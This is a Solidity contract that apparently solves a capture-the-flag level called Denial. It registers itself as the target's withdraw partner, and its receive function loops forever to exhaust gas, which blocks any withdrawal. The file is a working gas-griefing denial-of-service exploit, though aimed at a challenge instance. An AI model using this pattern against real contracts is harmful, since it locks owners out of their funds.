// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";

contract Solve {
    function run() external {
        address denial = 0xa68de422b8746c7457478e30D3ec34578F9efCaE;
        (bool success, ) = payable(denial).call(
            abi.encodeWithSignature("setWithdrawPartner(address)", address(this))
        );
        !success;
    }

    receive() external payable {
        while (true) {}
    }
}